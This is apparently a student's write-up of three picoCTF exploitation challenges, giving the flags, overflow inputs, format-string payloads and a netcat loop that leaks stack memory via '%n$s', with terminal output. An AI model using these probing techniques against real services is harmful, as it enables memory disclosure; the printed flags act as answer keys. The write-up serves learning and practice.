# buffer overflow 0
 

**Flag:** `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`

How you approached the challenge:
- On examining the source code, i found the sigsegv_handler function which will print the flag if a `SIGSEGV` or `SIGNAL SEGMENTATION VIOLATION` occurs.
- Now I only needed to trigger `SIGSEGV` , which can be achieved by buffer overflow.
- In the source code, two vulnerable functions are used, which are `gets` and `strcpy`, any of these can cause buffer overflow.
- If i input a string with more than 100 characters, the `gets` function in `main` will trigger `SIGSEGV`.
- If i input a string with more than 16 character, the `strcpy` function in `vuln` will trigger `SIGSEGV`
```bash
vishad@VISHAD:~$ nc saturn.picoctf.net 49889
Input: 123412341234123412341
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```  
What you learned through solving this challenge:

1. Buffer Overflow

2. Signaling `SIGSEGV` using `signal` 

4. Difference between `gets` & `fgets`

5. Risky C function which can lead to security risks , like `gets` and `strcpy`

References
- https://owasp.org/www-community/attacks/Buffer_overflow_attack
- https://www.geeksforgeeks.org/segmentation-fault-sigsegv-vs-bus-error-sigbus/

- etc.


# format string 0

**Flag:**  `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`

  How you approached the challenge:
-  Upon examining the source code , I noticed there is `SIGSEGV` handler function , which means that a buffer overflow could leak the flag (as in the previous question), so i tried inputting a string with 48 characters & it fetched me the flag.
```bash
vishad@VISHAD:~$ nc mimas.picoctf.net 65521
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 123456789123456789123456789123456789123456789123
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```  


- I noticed `printf(choice1)` in the source code , which is a `format string vulnerability`, and different format specifiers like `%x %s etc` be used to extract data from stack memory leaking sensitive information.
- In the `serve_patrick` function , we need to input a burger name which should have characters more than `2*BUFSIZE` which is `64` to go to the next function `serve_bob` .
- Inputting any random string of more than 64 characters will not work because the `on_menu` function will check that it has to be out of the 3 given burgers.
- So I noticed `Gr%114d_Cheese` burger, which has a `%114d` in between it's string, is treated as a format specifier for `print` function which forces it to print `114` characters between `Gr` and `_cheese`.
- This makes the count have more than 64 characters `(123 to be exact)` and also passes the `on_menu` test & moves ahead to `serve_bob` 

```bash
vishad@VISHAD:~$ nc mimas.picoctf.net 65521
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
```
- Same logic is applied in the `serve_bob` function and I chose `Cla%sic_Che%s%steak` burger because `%s` is format string vulnerability and will leak sensitive information.
```bash
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
What you learned through solving this challenge:
1. Format String Vulnerability

2. using `print` without format specifiers can be dangerous

3. `scanf` can also cause buffer overflows

Other incorrect methods you tried:

 - I tried to overflow the buffer by inputting 33 characters (because BUFSIZE was 32) , but it did not happen and simply printed `There is no such burger yet!`

References
- https://owasp.org/www-community/attacks/Format_string_attack

# flag leak

**Flag:**  `picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}`

How you approached the challenge:

-we can see the string vulnerability in `printf(story);`, so i decided to do `%n$s` to leak the flag as string instead of hexadecimal when using `%x`, on writing `%n$s` i got random text like `   ` , so i needed to access various memory locations, and i decided to make a loop for `%n$s` from 1 to 50 and got the flag in between somewhere.
```bash
vishad@vishad:~$ for n in {1..50}; do echo "%${n}\$s" | nc saturn.picoctf.net 54992; done
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
a  
Tell me a story and then I'll tell you one >> Here's a story -
 Ãº,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
 .
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
       
Tell me a story and then I'll tell you one >> Here's a story -
 (  g  g  g  g  g  g  g  h  
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -
 !( 
Tell me a story and then I'll tell you one >> Here's a story -
  e 

Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
Tell me a story and then I'll tell you one >> Here's a story -
  
   
```

What you learned through solving this challenge:
1. use of `%n$s` in memory leak
2. Automatically getting values from different `n` using loop
  
Other incorrect methods you tried:
- Tried `%x%x...` multiple times
- Using `%s` without providing a memory address

References

 - https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/
 - https://owasp.org/www-community/attacks/Format_string_attack